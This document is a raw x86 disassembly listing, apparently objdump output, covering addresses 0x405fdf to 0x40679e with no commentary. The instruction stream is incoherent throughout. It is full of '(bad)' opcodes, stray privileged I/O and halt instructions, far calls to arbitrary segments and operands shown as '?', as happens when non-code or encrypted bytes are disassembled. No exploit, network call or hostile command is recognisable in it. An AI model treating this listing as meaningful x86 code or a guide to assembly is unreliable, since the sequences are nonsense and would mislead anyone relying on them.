  405fdf:	add    eax,0x79984acc
  405fe4:	in     al,0x8b
  405fe6:	outs   dx,DWORD PTR ds:[esi]
  405fe7:	mov    DWORD PTR [eax+0x36],eax
  405fea:	loope  0x405f77
  405fec:	stos   DWORD PTR es:[edi],eax
  405fed:	or     cl,BYTE PTR [ecx+0x28fbf47b]
  405ff3:	add    ch,cl
  405ff5:	sbb    al,0xe1
  405ff7:	(bad)  
  405ff8:	inc    esi
  405ff9:	xchg   ebx,eax
  405ffa:	add    edx,eax
  405ffc:	fwait
  405ffd:	jne    0x406070
  405fff:	push   ebx
  406000:	fisttp QWORD PTR [eax+0x13466358]
  406006:	inc    esi
  406007:	mov    edi,0x16bf18b
  40600c:	push   edx
  40600d:	sub    BYTE PTR [edi],bl
  40600f:	sub    DWORD PTR [edi],edi
  406011:	ds push ds
  406013:	test   bh,bl
  406015:	push   es
  406016:	test   BYTE PTR [esi+ecx*2],0xe2
  40601a:	out    0x92,al
  40601c:	(bad)  
  40601d:	inc    DWORD PTR [ebp-0x3ba87e46]
  406023:	stos   DWORD PTR es:[edi],eax
  406024:	out    0xd6,eax
  406026:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406027:	inc    ebx
  406028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406029:	add    DWORD PTR [eax],ebx
  40602b:	push   es
  40602c:	clc    
  40602d:	pop    ss
  40602e:	jecxz  0x406045
  406030:	xor    BYTE PTR fs:[edi],ah
  406033:	gs jmp 0x17835da8
  406039:	push   edi
  40603a:	sbb    DWORD PTR [esi+0x27],ecx
  40603d:	mov    al,0xfe
  40603f:	rcl    BYTE PTR [edi],1
  406041:	cwde   
  406042:	(bad)  
  406043:	popf   
  406044:	fcom   QWORD PTR [eax+0x12]
  406047:	mov    eax,ds:0xeb855858
  40604c:	fst    QWORD PTR [edi+0x40]
  40604f:	jne    0x4060b9
  406051:	mov    es,WORD PTR [ecx+edi*8-0x7005dd4f]
  406058:	jnp    0x4060a1
  40605a:	inc    eax
  40605b:	mov    WORD PTR [ebp+edx*2+0x68],gs
  40605f:	xchg   dh,al
  406061:	xchg   esp,eax
  406062:	dec    esp
  406063:	xlat   BYTE PTR ds:[ebx]
  406064:	(bad)  
  406065:	out    dx,eax
  406066:	jo     0x4060c3
  406068:	push   esi
  406069:	add    bh,BYTE PTR [ebx+0x72a0d48b]
  40606f:	fcmovbe st,st(1)
  406071:	sub    bh,BYTE PTR [ecx+0x74f0d6ba]
  406077:	inc    ecx
  406078:	scas   eax,DWORD PTR es:[edi]
  406079:	bound  eax,QWORD PTR [ebp+0x5e11a95f]
  40607f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406080:	jmp    0x4060ec
  406082:	mov    eax,ds:0x198dd8b5
  406087:	xor    edx,edi
  406089:	xchg   ecx,eax
  40608a:	mov    cl,0x92
  40608c:	mov    dl,0xa9
  40608e:	test   eax,0xaccbd2ee
  406093:	and    eax,0xbd7e5e50
  406098:	dec    edi
  406099:	jne    0x4060b6
  40609b:	push   esp
  40609c:	or     ch,ch
  40609e:	sub    BYTE PTR [edx],bh
  4060a0:	jmp    0x7be9c1ea
  4060a5:	gs aam 0x17
  4060a8:	mov    esp,0x556b88fe
  4060ad:	mov    ss,WORD PTR [esi+0x5a58b576]
  4060b3:	mov    cl,0x80
  4060b5:	xchg   ebx,eax
  4060b6:	mov    bh,0x20
  4060b8:	pop    ecx
  4060b9:	lock call 0x95c5:0x7ed1f446
  4060c1:	scas   al,BYTE PTR es:[edi]
  4060c2:	cmp    esi,edx
  4060c4:	jmp    0x5357b43f
  4060c9:	mov    WORD PTR [esi-0x21],?
  4060cc:	inc    edi
  4060cd:	(bad)  
  4060ce:	mov    bh,0x6f
  4060d0:	nop
  4060d1:	rcl    ebp,cl
  4060d3:	pusha  
  4060d4:	test   BYTE PTR [edx],ah
  4060d6:	adc    al,0xd4
  4060d8:	es (bad) 
  4060da:	int3   
  4060db:	and    BYTE PTR [edx-0x5742aa6b],0xc8
  4060e2:	ds jno 0x4060ad
  4060e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e6:	xchg   BYTE PTR [eax],al
  4060e8:	add    al,BYTE PTR [edi]
  4060ea:	cmp    DWORD PTR [edi],eax
  4060ec:	ds mov dh,0x9
  4060ef:	fiadd  WORD PTR [edx-0x61]
  4060f2:	loopne 0x40607a
  4060f4:	push   edi
  4060f5:	xchg   esi,eax
  4060f6:	ins    DWORD PTR es:[edi],dx
  4060f7:	add    DWORD PTR [eax+edx*1+0x52],edi
  4060fb:	dec    eax
  4060fc:	xchg   esi,eax
  4060fd:	daa    
  4060fe:	jns    0x406108
  406100:	adc    edi,DWORD PTR ds:0x824305be
  406106:	push   0xfffffff3
  406108:	mov    ah,0xd4
  40610a:	movhps xmm3,QWORD PTR [edx+0x1]
  40610e:	lods   eax,DWORD PTR ds:[esi]
  40610f:	add    DWORD PTR [ebp+0x59],ecx
  406112:	not    BYTE PTR [ebx]
  406114:	scas   al,BYTE PTR es:[edi]
  406115:	outs   dx,BYTE PTR ds:[esi]
  406116:	stos   DWORD PTR es:[edi],eax
  406117:	and    al,0x77
  406119:	pop    edx
  40611a:	lock out dx,eax
  40611c:	jmp    0x221eb916
  406121:	ja     0x40615b
  406123:	lea    eax,[edx]
  406125:	fist   DWORD PTR [esi]
  406127:	stos   BYTE PTR es:[edi],al
  406128:	ficomp WORD PTR [ecx+ebx*8]
  40612b:	stos   DWORD PTR es:[edi],eax
  40612c:	jmp    0xc615:0xf58820d1
  406133:	iret   
  406134:	iret   
  406135:	call   0xb1bc:0xe29f6854
  40613c:	ret    
  40613d:	add    al,0x8d
  40613f:	xchg   ebx,eax
  406140:	(bad)
  406144:	inc    ecx
  406145:	test   al,0xbf
  406147:	icebp  
  406148:	xlat   BYTE PTR ds:[ebx]
  406149:	int3   
  40614a:	nop
  40614b:	test   eax,0x43a5912c
  406150:	(bad)  
  406151:	xor    bh,ch
  406153:	xchg   edi,eax
  406154:	out    0x7b,al
  406156:	(bad)  
  406157:	retf   
  406158:	pop    ss
  406159:	mov    dh,0xf1
  40615b:	mov    ebp,0x3c9250d8
  406160:	mov    ds:0xd659abaa,al
  406165:	(bad)  [ebx]
  406167:	xor    DWORD PTR [ebp-0x582f6469],0x595ba6d
  406171:	xchg   esp,eax
  406172:	rcr    eax,0xa3
  406175:	ficomp WORD PTR [edi+0x6a]
  406178:	dec    ebx
  406179:	cmp    eax,esi
  40617b:	or     al,0x3c
  40617d:	push   ss
  40617e:	fwait
  40617f:	push   ds
  406180:	xor    dl,0x1c
  406183:	js     0x4061c6
  406185:	ret    
  406186:	aad    0x3d
  406188:	sub    edi,DWORD PTR [esi+eiz*1]
  40618b:	call   0xb471:0x2cabb33a
  406192:	and    edx,DWORD PTR [edx+0x15d6df60]
  406198:	lahf   
  406199:	rol    DWORD PTR [eax-0x51bd7626],0x45
  4061a0:	dec    edx
  4061a1:	add    eax,0xbd7ec0c5
  4061a6:	mov    ?,WORD PTR [ebp+0x76]
  4061a9:	mov    esp,edi
  4061ab:	shl    DWORD PTR [ecx],1
  4061ad:	cmp    BYTE PTR [ecx+0x8],bh
  4061b0:	xchg   DWORD PTR [esi],ebx
  4061b2:	jbe    0x4061d5
  4061b4:	aad    0xb4
  4061b6:	mov    ds:0xb578858e,al
  4061bb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061bd:	jbe    0x406198
  4061bf:	clc    
  4061c0:	push   edi
  4061c1:	cmp    eax,0xfde22434
  4061c6:	jecxz  0x40615d
  4061c8:	iret   
  4061c9:	pusha  
  4061ca:	hlt    
  4061cb:	(bad)  
  4061cd:	mov    ?,edx
  4061cf:	das    
  4061d0:	jb     0x4061b2
  4061d2:	jnp    0x40615a
  4061d4:	push   eax
  4061d5:	(bad)  
  4061d6:	scas   eax,DWORD PTR es:[edi]
  4061d7:	les    edx,FWORD PTR [ebp+0x5d]
  4061da:	pop    ds
  4061db:	mov    ?,WORD PTR [ebx]
  4061dd:	(bad)  
  4061de:	repz jne 0x406250
  4061e1:	push   ds
  4061e2:	stos   BYTE PTR es:[edi],al
  4061e3:	pop    gs
  4061e5:	jle    0x406221
  4061e7:	fidivr DWORD PTR [edx]
  4061e9:	nop
  4061ea:	out    0x45,eax
  4061ec:	js     0x406180
  4061ee:	xor    BYTE PTR [esi-0x50d45f35],dl
  4061f4:	mov    ds:0x781957d6,eax
  4061f9:	jge    0x406180
  4061fb:	(bad)  
  4061fd:	stos   BYTE PTR es:[edi],al
  4061fe:	ret    0x8671
  406201:	xor    BYTE PTR [ebx-0x16],dl
  406204:	and    bh,BYTE PTR [ecx-0x60]
  406207:	dec    esi
  406208:	pop    ebp
  406209:	arpl   WORD PTR ds:0x29bd76bf,ax
  40620f:	in     al,0x71
  406211:	lea    ebx,[ecx+0x18ed3ab4]
  406217:	(bad)  
  406218:	jbe    0x4061ff
  40621a:	(bad)  
  40621b:	(bad)  
  40621c:	stc    
  40621d:	push   es
  40621e:	out    dx,al
  40621f:	add    cl,BYTE PTR [edi+0x2e55227e]
  406225:	sbb    BYTE PTR [ebp-0x6b],cl
  406228:	jne    0x40625e
  40622a:	stos   BYTE PTR es:[edi],al
  40622b:	nop
  40622c:	or     edi,DWORD PTR [ebp-0x80d4b9]
  406232:	fnstsw WORD PTR [edx+0x19]
  406235:	jp     0x406211
  406237:	xchg   BYTE PTR [ebp-0x761a80],dl
  40623d:	xlat   BYTE PTR ds:[ebx]
  40623e:	or     edx,edx
  406240:	ret    0xc5a3
  406243:	jns    0x40621f
  406245:	ficomp DWORD PTR [edx]
  406247:	sahf   
  406248:	inc    esp
  406249:	adc    eax,0xb72e734a
  40624e:	or     esp,DWORD PTR [edx+0x308d3737]
  406254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406255:	sar    eax,0x8c
  406258:	xchg   esp,eax
  406259:	test   al,0x20
  40625b:	push   ebp
  40625c:	mov    esp,0xa54df8e1
  406261:	or     dl,cl
  406263:	sub    ah,BYTE PTR [ebx+eiz*1]
  406266:	(bad)  
  406267:	mov    ecx,0x165c4f46
  40626c:	faddp  st(2),st
  40626e:	outs   dx,BYTE PTR ds:[esi]
  40626f:	std    
  406270:	mov    cs,WORD PTR [ebp-0x28]
  406273:	adc    DWORD PTR [ebp-0x18d07dd4],esi
  406279:	aas    
  40627a:	lahf   
  40627b:	inc    esp
  40627c:	shl    BYTE PTR [esi+0x7b],cl
  40627f:	ret    
  406280:	pop    ecx
  406281:	jo     0x4062bc
  406283:	ss xchg ebx,edx
  406286:	(bad)  
  406288:	xchg   esp,ecx
  40628a:	mov    esi,0x6a494e25
  40628f:	jge    0x40630b
  406291:	cmc    
  406292:	outs   dx,DWORD PTR ds:[esi]
  406293:	jns    0x406282
  406295:	mov    ah,0xe1
  406297:	int    0x29
  406299:	jge    0x40630e
  40629b:	mov    cs,WORD PTR [eax]
  40629d:	add    BYTE PTR [edi+0x32545f80],ch
  4062a3:	ins    DWORD PTR es:[edi],dx
  4062a4:	mov    ds:0x569f8459,eax
  4062a9:	push   edi
  4062aa:	lahf   
  4062ab:	ja     0x40626c
  4062ad:	jecxz  0x40625f
  4062af:	add    al,BYTE PTR [ecx-0x1]
  4062b2:	jno    0x406244
  4062b4:	sub    eax,0x14a022d9
  4062b9:	icebp  
  4062ba:	mov    DWORD PTR [eax],eax
  4062bc:	xor    eax,0x3185a148
  4062c1:	xor    eax,0x80c12716
  4062c6:	cmc    
  4062c7:	repz clc 
  4062c9:	sbb    BYTE PTR [esp+edi*8],dl
  4062cc:	loop   0x4062e0
  4062ce:	cmp    eax,esi
  4062d0:	std    
  4062d1:	sub    dh,dh
  4062d3:	daa    
  4062d4:	stos   DWORD PTR es:[edi],eax
  4062d5:	xor    eax,0xd40cacaa
  4062da:	out    dx,al
  4062db:	out    dx,eax
  4062dc:	das    
  4062dd:	add    DWORD PTR [edx+0xc],0x56
  4062e1:	or     dl,BYTE PTR [ecx]
  4062e3:	and    ecx,esp
  4062e5:	fstp   QWORD PTR [edi+0x17]
  4062e8:	sbb    DWORD PTR [edi],esp
  4062ea:	cli    
  4062eb:	sbb    ah,dl
  4062ed:	or     eax,0xa575d973
  4062f2:	ret    0xfd53
  4062f5:	aad    0xf2
  4062f7:	ror    DWORD PTR [ebx-0x5c],0xa0
  4062fb:	adc    BYTE PTR [edx-0x747a9ea4],bl
  406301:	enter  0xa799,0x4c
  406305:	inc    DWORD PTR ds:0x25cf4261
  40630b:	mov    esi,0xe99c6c02
  406310:	cdq    
  406311:	fcom   QWORD PTR [ecx-0x6abc4ffd]
  406317:	repz xchg eax,eax
  40631a:	(bad)  
  40631b:	outs   dx,BYTE PTR ds:[esi]
  40631c:	cmp    ebx,edx
  40631e:	pop    ecx
  40631f:	pop    ebx
  406320:	xchg   edx,eax
  406321:	stos   DWORD PTR es:[edi],eax
  406322:	xchg   ebp,eax
  406323:	pop    esp
  406324:	sub    al,0xe7
  406326:	jo     0x4062b6
  406328:	in     eax,0xfa
  40632a:	dec    edi
  40632b:	jno    0x406333
  40632d:	jl     0x4062fb
  40632f:	call   0xd5a6:0xdc409eb0
  406336:	and    BYTE PTR [eax-0x74],dh
  406339:	push   ds
  40633a:	pop    ecx
  40633b:	sbb    eax,0xb18cf717
  406340:	xchg   ecx,eax
  406341:	xor    DWORD PTR [ecx-0x4225ef3c],edx
  406347:	pop    esi
  406348:	push   eax
  40634a:	test   al,0xd4
  40634c:	std    
  40634d:	jno    0x4063b9
  40634f:	or     DWORD PTR [edx+0xe4862ac],eax
  406355:	leave  
  406356:	ins    BYTE PTR es:[edi],dx
  406357:	inc    esi
  406358:	dec    esi
  406359:	cs stos BYTE PTR es:[edi],al
  40635b:	in     eax,dx
  40635c:	imul   edx,DWORD PTR [edi+0x31fd7ad4],0x4d
  406363:	mov    edi,0xaab4288b
  406368:	xor    DWORD PTR [edi+0x2c4ba154],edx
  40636e:	outs   dx,DWORD PTR ds:[esi]
  40636f:	push   ebp
  406370:	pop    esi
  406371:	stos   DWORD PTR es:[edi],eax
  406372:	adc    eax,0xb1a7d578
  406377:	mov    ch,al
  406379:	into   
  40637a:	(bad)  
  40637b:	nop
  40637c:	fsubr  QWORD PTR [edx-0x3f]
  40637f:	stos   DWORD PTR es:[edi],eax
  406380:	mov    dh,0x23
  406382:	sub    ah,BYTE PTR [edx-0x21b6ba60]
  406388:	shl    BYTE PTR [eax+0x64],0x91
  40638c:	xchg   ecx,edi
  40638e:	push   edi
  40638f:	mov    ss,WORD PTR [ebx]
  406391:	out    0xc8,al
  406393:	arpl   WORD PTR ds:0x4e8d7637,sp
  406399:	in     al,dx
  40639a:	push   edx
  40639b:	bound  edx,QWORD PTR [edi-0x4bf69210]
  4063a1:	call   0x3e2ca383
  4063a6:	mov    WORD PTR [edx+0x99e469c],gs
  4063ac:	pop    eax
  4063ad:	and    DWORD PTR ds:0xa3d3f022,eax
  4063b3:	stos   BYTE PTR es:[edi],al
  4063b4:	in     al,0xa8
  4063b6:	pusha  
  4063b7:	mov    dh,0x94
  4063b9:	pop    ss
  4063ba:	scas   eax,DWORD PTR es:[edi]
  4063bb:	bound  ecx,QWORD PTR [eax+0x2d]
  4063be:	or     ah,BYTE PTR [ebx-0x2a]
  4063c1:	loop   0x40637e
  4063c3:	psadbw mm6,mm7
  4063c6:	dec    ebp
  4063c7:	cmc    
  4063c8:	ror    DWORD PTR [ebp+0x23],0xe1
  4063cc:	scas   al,BYTE PTR es:[edi]
  4063cd:	push   ss
  4063ce:	mov    ds:0x97ec9147,eax
  4063d3:	hlt    
  4063d4:	in     al,0x93
  4063d6:	or     eax,0x3373e3fc
  4063db:	xchg   BYTE PTR [edi-0x10],bl
  4063de:	sbb    esi,esp
  4063e0:	fidivr DWORD PTR ds:0x4a66b29e
  4063e6:	clc    
  4063e7:	dec    ebx
  4063e8:	les    edx,FWORD PTR [eax+0x53]
  4063eb:	mov    ss,edx
  4063ed:	scas   al,BYTE PTR es:[edi]
  4063ee:	cmp    eax,eax
  4063f0:	std    
  4063f1:	add    ah,cl
  4063f3:	inc    eax
  4063f4:	repz jnp 0x406460
  4063f7:	jp     0x4063c9
  4063f9:	jns    0x4063c6
  4063fb:	add    bh,BYTE PTR [edi]
  4063fd:	lds    ebp,FWORD PTR [edx]
  4063ff:	pop    esp
  406400:	push   ss
  406401:	mov    ch,0x9f
  406403:	retf   
  406404:	push   esp
  406405:	mov    esi,0xaa78a35f
  40640a:	cld    
  40640b:	jle    0x406403
  40640d:	xchg   edx,eax
  40640e:	sub    DWORD PTR [edi+0x57f34c33],0xdf4f0110
  406418:	mov    dl,0x30
  40641a:	mov    esp,0x85e6bd79
  40641f:	jae    0x4064a0
  406421:	or     ebx,DWORD PTR [esi-0x59cbd472]
  406427:	arpl   WORD PTR [esi-0x71],bx
  40642a:	dec    ebx
  40642b:	ins    DWORD PTR es:[edi],dx
  40642c:	frstor [edx+0x81d84c7]
  406432:	ja     0x4064a6
  406434:	xor    eax,0x6194bcf0
  406439:	push   0xffffffef
  40643b:	dec    edi
  40643c:	(bad)  
  40643d:	rol    DWORD PTR [ecx+0xfd8f434],1
  406443:	in     eax,0x2e
  406445:	adc    dl,0x6a
  406448:	les    edx,FWORD PTR [ebx]
  40644a:	xchg   edi,eax
  40644b:	lods   eax,DWORD PTR ds:[esi]
  40644c:	out    dx,al
  40644d:	push   ebx
  40644e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40644f:	or     cl,0xb2
  406452:	out    0x35,al
  406454:	cmp    BYTE PTR [esi-0x47026c80],dh
  40645a:	test   al,0x2f
  40645c:	and    eax,0x3d12bf3b
  406461:	fldcw  WORD PTR [edx-0x55aa050f]
  406467:	xor    BYTE PTR [edi-0x280df5f2],ch
  40646d:	test   edx,0x3985e778
  406473:	inc    esp
  406474:	mov    esi,0xc270feb9
  406479:	sbb    eax,ebx
  40647b:	test   DWORD PTR [edi+0x4501121a],edi
  406481:	jl     0x4064f8
  406483:	cmp    DWORD PTR [edx+0x1de0e3ee],ecx
  406489:	xor    BYTE PTR [edx],ah
  40648b:	(bad)  
  40648c:	clc    
  40648d:	loopne 0x4064c1
  40648f:	xor    eax,0xaf48e21b
  406494:	dec    ecx
  406495:	aam    0x52
  406497:	xchg   esi,eax
  406498:	adc    DWORD PTR [ebx+0x6b9c274],eax
  40649e:	sub    ch,0xec
  4064a1:	js     0x406430
  4064a3:	cwde   
  4064a4:	dec    esi
  4064a5:	out    0x97,eax
  4064a7:	cld    
  4064a8:	xchg   BYTE PTR [ecx],cl
  4064aa:	pushf  
  4064ab:	or     BYTE PTR [edx+esi*4+0xb58cb75],bl
  4064b2:	and    eax,0x828320f6
  4064b7:	pop    es
  4064b8:	shl    ah,0xd8
  4064bb:	imul   esp,DWORD PTR [edi-0x17],0x652f0d0c
  4064c2:	add    eax,0xd9b24fb5
  4064c7:	fdiv   DWORD PTR [eax+0x78ec5416]
  4064cd:	pop    edx
  4064ce:	mov    al,BYTE PTR [ebp-0x74]
  4064d1:	cdq    
  4064d2:	idiv   DWORD PTR [ebx]
  4064d4:	cmp    al,0x45
  4064d6:	repz out 0xf0,al
  4064d9:	rol    DWORD PTR [edi-0x20],0x0
  4064dd:	and    al,0xe1
  4064df:	cmp    esp,DWORD PTR [bp+di]
  4064e2:	mov    ecx,0xf19bfc69
  4064e7:	lods   eax,DWORD PTR ds:[esi]
  4064e8:	lahf   
  4064e9:	lds    esi,FWORD PTR [edx]
  4064eb:	fst    DWORD PTR [ebp-0x6e]
  4064ee:	or     DWORD PTR [eax+ecx*4-0x29368bd8],ecx
  4064f5:	ret    
  4064f6:	xchg   esp,eax
  4064f7:	mov    ebx,0x6e1ad30d
  4064fc:	lds    ebx,FWORD PTR [edi-0x5f9a2850]
  406502:	int    0x8b
  406504:	hlt    
  406505:	jbe    0x40648b
  406507:	imul   esp,DWORD PTR [eax-0x17],0xffffffd7
  40650b:	not    DWORD PTR [esi+0x3dc23d1a]
  406511:	jge    0x4064dd
  406513:	mov    bl,0x30
  406515:	mov    esi,0x5c9c0082
  40651a:	jno    0x40653b
  40651c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40651d:	jl     0x40659c
  40651f:	int    0x38
  406521:	lahf   
  406522:	repz xor al,0x67
  406525:	inc    esp
  406526:	or     BYTE PTR [esi],ah
  406528:	push   es
  406529:	mov    esp,0x2c451854
  40652e:	ss out 0xfb,eax
  406531:	push   0x31f55c1e
  406536:	jmp    0x4064cb
  406538:	xchg   ecx,eax
  406539:	jp     0x406556
  40653b:	sbb    BYTE PTR [ebp+0x5b],al
  40653e:	add    eax,0xa9195900
  406543:	aam    0x43
  406545:	and    ah,cl
  406547:	xor    DWORD PTR [ecx],esi
  406549:	das    
  40654a:	pushf  
  40654b:	data16 jb 0x406533
  40654e:	lock xor al,0xe3
  406551:	scas   al,BYTE PTR es:[edi]
  406552:	shr    BYTE PTR [ecx+0x5a],cl
  406555:	mov    bl,cl
  406557:	in     al,dx
  406558:	div    BYTE PTR [esi+0x1bffc588]
  40655e:	mov    ebp,0xe5f1fa
  406563:	(bad)  
  406564:	sub    al,0x96
  406566:	outs   dx,DWORD PTR ds:[esi]
  406567:	sub    BYTE PTR [ebp-0x3e733b5c],dl
  40656d:	jnp    0x406503
  40656f:	pop    edx
  406570:	imul   ebp,DWORD PTR [edi],0x26f224a3
  406576:	xor    BYTE PTR [ecx+esi*2-0x5a9f2696],bh
  40657d:	mov    al,0xe3
  40657f:	daa    
  406580:	aam    0x37
  406582:	sahf   
  406583:	jo     0x4065be
  406585:	(bad)  
  406586:	retf   
  406587:	dec    ah
  406589:	into   
  40658a:	mov    eax,ds:0x4fc5d8f
  40658f:	aas    
  406590:	int    0xb2
  406592:	adc    ch,dh
  406594:	fild   WORD PTR [ebx+0x5b79ab4d]
  40659a:	sbb    ebp,DWORD PTR [eax-0x420a879b]
  4065a0:	and    dh,BYTE PTR [ebp+0x42895125]
  4065a6:	cmp    bl,BYTE PTR [ebx]
  4065a8:	icebp  
  4065a9:	out    0x5c,eax
  4065ab:	stos   DWORD PTR es:[edi],eax
  4065ac:	or     dh,BYTE PTR [ecx]
  4065ae:	(bad)  
  4065af:	in     eax,dx
  4065b0:	pop    es
  4065b1:	fimul  DWORD PTR [ebp-0x7]
  4065b4:	push   es
  4065b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065b6:	icebp  
  4065b7:	out    0xb6,al
  4065b9:	pop    ecx
  4065ba:	adc    edi,eax
  4065bc:	inc    ebp
  4065bd:	mov    al,ds:0xeccf386c
  4065c2:	pop    ss
  4065c3:	outs   dx,DWORD PTR ds:[esi]
  4065c4:	outs   dx,BYTE PTR ds:[esi]
  4065c5:	add    eax,0x52769180
  4065ca:	gs scas al,BYTE PTR es:[edi]
  4065cc:	pop    edx
  4065cd:	(bad)  
  4065ce:	jge    0x40661e
  4065d0:	jl     0x406576
  4065d2:	jae    0x4065ad
  4065d4:	xchg   ebp,eax
  4065d5:	call   0x8e7b2a4b
  4065da:	shl    DWORD PTR [esi+0x6decc52d],0x3b
  4065e1:	call   0xf0d6:0x24f80378
  4065e8:	aaa    
  4065e9:	sbb    eax,0x9bca4de1
  4065ee:	fdivr  DWORD PTR [edi-0x1aae1cd4]
  4065f4:	cmp    esp,ebp
  4065f6:	xchg   DWORD PTR [edi-0x50],esi
  4065f9:	add    cl,ch
  4065fb:	sbb    eax,0x291fad45
  406600:	daa    
  406601:	fisttp WORD PTR [edx-0x3a]
  406604:	pop    ebx
  406605:	dec    eax
  406606:	or     DWORD PTR [esi-0x21],esp
  406609:	out    0xf1,eax
  40660b:	nop
  40660c:	nop
  40660d:	shl    DWORD PTR [eax-0x45],cl
  406610:	cmp    BYTE PTR [ebx],cl
  406612:	xor    ecx,edi
  406614:	std    
  406615:	call   0xc4c3:0x61c3fa4d
  40661c:	sub    eax,0x9223c0d6
  406621:	in     eax,0xd4
  406623:	aam    0x79
  406625:	adc    cl,BYTE PTR [ecx+0x68a17d15]
  40662b:	outs   dx,DWORD PTR ds:[esi]
  40662c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40662d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40662e:	cmp    cl,ch
  406630:	retf   
  406631:	std    
  406632:	(bad)  
  406634:	sti    
  406635:	add    DWORD PTR [esi+0x6f1353a0],edx
  40663b:	fprem1 
  40663d:	xchg   edx,eax
  40663e:	into   
  40663f:	out    dx,al
  406640:	paddusb mm3,mm5
  406643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406644:	pushf  
  406645:	gs scas al,BYTE PTR es:[edi]
  406647:	push   esp
  406648:	loope  0x406642
  40664a:	dec    eax
  40664b:	and    al,0x46
  40664d:	mov    ?,WORD PTR [ebx]
  40664f:	mov    edx,0x23258468
  406654:	push   cs
  406655:	and    dl,al
  406657:	das    
  406658:	ror    cl,1
  40665a:	xchg   DWORD PTR [edx+0x48],edx
  40665d:	pushf  
  40665e:	adc    dh,BYTE PTR [ebx+0x49ca4d02]
  406664:	test   al,0xcb
  406666:	jg     0x40660f
  406668:	dec    ecx
  406669:	clc    
  40666a:	fsub   DWORD PTR [eax]
  40666c:	push   0x5d
  40666e:	mov    esp,DWORD PTR [eax]
  406670:	int3   
  406671:	inc    ecx
  406672:	test   eax,0xe1f044c2
  406677:	test   eax,0x678bd637
  40667c:	jo     0x4066aa
  40667e:	(bad)  
  40667f:	mov    cl,0x0
  406681:	mov    esp,0x3f0d7ceb
  406686:	xor    eax,0xfdcc0087
  40668b:	ror    BYTE PTR [eax],1
  40668d:	out    0xaa,al
  40668f:	sub    al,0x16
  406691:	push   cs
  406692:	ds (bad) ss:[esi+0x6b16e6f8]
  40669a:	dec    edi
  40669b:	pop    edx
  40669c:	popf   
  40669d:	(bad)  
  40669e:	les    eax,FWORD PTR [eax]
  4066a0:	and    al,BYTE PTR [ecx]
  4066a2:	jmp    0x4066ae
  4066a4:	push   0x20f4f7a6
  4066a9:	repnz leave 
  4066ab:	test   edi,0xe67cc86a
  4066b1:	add    ebp,DWORD PTR [esi-0x1807be1f]
  4066b7:	mov    ds:0xe5a04edc,al
  4066bc:	outs   dx,DWORD PTR ds:[esi]
  4066bd:	pop    ecx
  4066be:	cli    
  4066bf:	xor    eax,0xc29ab1ff
  4066c4:	dec    edx
  4066c5:	add    eax,0x2265cd2a
  4066ca:	scas   al,BYTE PTR es:[di]
  4066cc:	js     0x4066f4
  4066ce:	pop    edx
  4066cf:	idiv   BYTE PTR [edx]
  4066d1:	nop
  4066d2:	push   ebx
  4066d3:	mov    esi,0x579512c3
  4066d8:	push   ebp
  4066d9:	outs   dx,DWORD PTR ds:[esi]
  4066da:	adc    BYTE PTR ds:0xd644628a,dh
  4066e0:	es push ebx
  4066e2:	push   es
  4066e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066e4:	sti    
  4066e5:	xchg   DWORD PTR [esi],ebp
  4066e7:	mov    cl,al
  4066e9:	daa    
  4066ea:	mov    WORD PTR ds:0x3c447fd0,cs
  4066f0:	outs   dx,DWORD PTR ds:[esi]
  4066f1:	cmp    BYTE PTR [ecx+0x6a1bf4bd],bh
  4066f7:	mov    cl,0x15
  4066f9:	dec    ecx
  4066fa:	sub    BYTE PTR [esi],al
  4066fc:	imul   edx,DWORD PTR [esi+ebp*2+0x6c],0x54459583
  406704:	mov    edx,0xfb362b6e
  406709:	jae    0x406721
  40670b:	hlt    
  40670c:	inc    ecx
  40670d:	outs   dx,DWORD PTR ds:[esi]
  40670e:	nop
  40670f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406710:	mov    eax,ds:0xb76d1c18
  406715:	push   0xfccbff99
  40671a:	sub    eax,0xe8e10d77
  40671f:	dec    BYTE PTR [ebx+0x2ec383f]
  406725:	lea    edx,[eax+0x763f4daf]
  40672b:	popa   
  40672c:	jnp    0x406773
  40672e:	repz and dh,BYTE PTR [edi]
  406731:	jl     0x40674f
  406733:	cld    
  406734:	rcr    BYTE PTR [esi+0x2c],1
  406737:	dec    esi
  406738:	inc    esi
  406739:	mov    eax,ds:0x35a76fb6
  40673e:	hlt    
  40673f:	cmp    ecx,DWORD PTR [eax+eax*4]
  406742:	adc    edx,DWORD PTR [ecx+0x60801a9b]
  406748:	mov    al,ds:0xaf17aeb5
  40674d:	mov    cl,0x10
  40674f:	mov    bh,0x64
  406751:	pop    ebx
  406752:	push   cs
  406753:	dec    ecx
  406754:	(bad)  
  406755:	mov    esp,0x9cb7f360
  40675a:	(bad)  
  40675b:	fcomp  QWORD PTR [eax+eax*8]
  40675e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40675f:	jnp    0x40676b
  406761:	jo     0x4067ac
  406763:	(bad)  
  406764:	adc    al,0x56
  406766:	add    eax,DWORD PTR [edi-0x39]
  406769:	cmp    al,0xa2
  40676b:	sub    BYTE PTR [edx-0x2],dh
  40676e:	xor    al,0xe0
  406770:	ss scas eax,DWORD PTR es:[edi]
  406772:	dec    eax
  406773:	retf   
  406774:	jle    0x406718
  406776:	sbb    al,0x55
  406778:	sti    
  406779:	and    eax,DWORD PTR [ecx-0x50f71391]
  40677f:	xchg   ebp,eax
  406780:	add    BYTE PTR [eax],al
  406782:	mov    WORD PTR ds:0x6926e751,ds
  406788:	and    ch,BYTE PTR [ebp+0x1d]
  40678b:	in     eax,0x42
  40678d:	mov    esp,0x392b846f
  406792:	jmp    0x4067de
  406794:	nop
  406795:	clc    
  406796:	add    esi,DWORD PTR ds:0x2863a682
  40679d:	ret    
  40679e:	(bad)  
